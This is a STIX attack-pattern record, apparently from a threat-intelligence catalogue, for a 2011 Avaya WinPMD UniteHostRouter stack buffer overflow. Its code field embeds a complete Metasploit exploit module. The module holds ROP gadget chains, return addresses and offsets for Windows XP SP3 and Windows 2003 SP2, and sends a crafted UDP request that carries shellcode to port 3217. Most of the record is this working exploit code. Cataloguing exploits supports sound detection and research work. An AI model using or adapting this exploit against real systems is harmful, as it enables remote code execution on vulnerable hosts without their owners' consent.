{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3263f39b-149c-4bc1-b49a-cd1b9764c19c",
    "created": "2024-08-14T16:47:26.63523Z",
    "modified": "2024-08-14T16:47:26.635233Z",
    "name": "Avaya WinPMD UniteHostRouter Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Avaya WinPMD. The vulnerability exists in the UniteHostRouter service, due to the insecure usage of memcpy when parsing specially crafted \"To:\" headers. The module has been tested successfully on Avaya WinPMD 3.8.2 over Windows XP SP3 and Windows 2003 SP2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/avaya_winpmd_unihostrouter.rb",
            "external_id": "avaya_winpmd_unihostrouter.rb"
        },
        {
            "source_name": "reference",
            "url": "https://downloads.avaya.com/css/P8/documents/100140122"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20110527165515/http://secunia.com:80/advisories/44062"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Avaya WinPMD UniteHostRouter Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Avaya WinPMD. The vulnerability\n        exists in the UniteHostRouter service, due to the insecure usage of memcpy when\n        parsing specially crafted \"To:\" headers. The module has been tested successfully on\n        Avaya WinPMD 3.8.2 over Windows XP SP3 and Windows 2003 SP2.\n      },\n      'Author'         =>\n        [\n          'AbdulAziz Hariri', # Vulnerability discovery\n          'Unknown',          # Abysssec, PoC\n          'juan vazquez'      # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '82764'],\n          ['OSVDB', '73269'],\n          ['BID', '47947'],\n          ['EDB', '18397'],\n          ['URL', 'https://downloads.avaya.com/css/P8/documents/100140122'],\n          ['URL', 'http://web.archive.org/web/20110527165515/http://secunia.com:80/advisories/44062']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\\x0d\\x0a\\x20\\x2f\\x3a\\x3f\",\n          'Space' => 1024,\n          'DisableNops' => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Avaya WinPMD 3.8.2 / Windows XP SP3',\n            {\n              'Offset' => 260,\n              'Ret' => 0x77c2e93b # MOV EAX,EDI # POP EDI # RETN from msvcrt\n            }\n          ],\n          ['Avaya WinPMD 3.8.2 / Windows 2003 SP2',\n            {\n              'Offset' => 260,\n              'Ret' => 0x0040e0f2 # ADD ESP,44 # POP ESI # ADD ESP,0C8 # RETN from UniteHostRouter.EXE\n            }\n          ]\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2011-05-23',\n      'DefaultTarget'  => 0\n      ))\n\n    register_options([ Opt::RPORT(3217) ])\n  end\n\n  def junk(n=4)\n    return rand_text_alpha(n).unpack(\"V\")[0].to_i\n  end\n\n  def nop\n    return make_nops(4).unpack(\"V\")[0].to_i\n  end\n\n  def exploit\n    connect_udp\n\n    if target.name =~ /Windows XP SP3/\n      buf = \"\\xeb\\x7f\" # jmp short $+0x81\n      buf << rand_text(0x81 - 2)\n      buf << \"\\xeb\\x7f\" # jmp short $+0x81\n      buf << rand_text(0x81 - 2)\n      buf << \"\\xeb\\x64\" # jmp short $+0x66 # jmp to shellcode in the heap\n      buf << [target.ret].pack(\"V\") # MOV EAX,EDI # POP EDI # RETN # from msvcrt # EDI points to data in the heap\n      buf << [0x77c5f9a0].pack(\"V\") # Readable address with string # from msvcrt\n      buf << ([0x77c3c99c].pack(\"V\")) * 21 # (INC EAX # RETN) * 21 # from msvcrt # EAX points to data in th heap, align to shellcode position\n      buf << [0x77c168cd].pack(\"V\") # jmp eax # from msvcrt.dll # JMP to shellcode in the heap\n    elsif target.name =~ /Windows 2003 SP2/\n      rop_gadgets =\n        [\n          0x77bb2563, # POP EAX # RETN\n          0x77ba1114, # <- *&VirtualProtect()\n          0x77bbf244, # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN\n          junk,\n          0x77bb0c86, # XCHG EAX,ESI # RETN\n          0x77bc9801, # POP EBP # RETN\n          0x77be2265, # ptr to 'push esp #  ret'\n          0x77bb2563, # POP EAX # RETN\n          0x03C0990F,\n          0x77bdd441, # SUB EAX, 03c0940f  (dwSize, 0x500 -> ebx)\n          0x77bb48d3, # POP EBX, RET\n          0x77bf21e0, # .data\n          0x77bbf102, # XCHG EAX,EBX # ADD BYTE PTR DS:[EAX],AL # RETN\n          0x77bbfc02, # POP ECX # RETN\n          0x77bef001, # W pointer (lpOldProtect) (-> ecx)\n          0x77bd8c04, # POP EDI # RETN\n          0x77bd8c05, # ROP NOP (-> edi)\n          0x77bb2563, # POP EAX # RETN\n          0x03c0984f,\n          0x77bdd441, # SUB EAX, 03c0940f\n          0x77bb8285, # XCHG EAX,EDX # RETN\n          0x77bb2563, # POP EAX # RETN\n          nop,\n          0x77be6591, # PUSHAD # ADD AL,0EF # RETN\n        ].pack(\"V*\")\n      buf = rand_text(3) # padding\n      buf << rop_gadgets\n      buf << \"\\xeb\\x7f\" # jmp $+0x81\n      buf << rand_text(0x81-2)\n      buf << \"\\xeb\\x25\" # jmp short $+0x66 => to shellcode\n      buf << rand_text(target['Offset'] - buf.length)\n      buf << \"\\xf2\\xe0\\x40\" # EIP => # ADD ESP,44 # POP ESI # ADD ESP,0C8 # RETN from [UniteHostRouter.EXE # stackpivot to heap\n    end\n\n    request = \"UTP/1 To: 127.0.0.1 /#{buf}\\r\\n\\r\\n\"\n\n    if target.name =~ /Windows 2003 SP2/\n      request << \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp, -3500\n    end\n\n    request << payload.encoded # The shellcode will be stored in the heap\n\n    print_status(\"#{rhost}:#{rport} - Trying to exploit #{target.name}...\")\n    udp_sock.put(request)\n    disconnect_udp\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-05-23",
    "x_mitre_platforms": [
        "win'"
    ]
}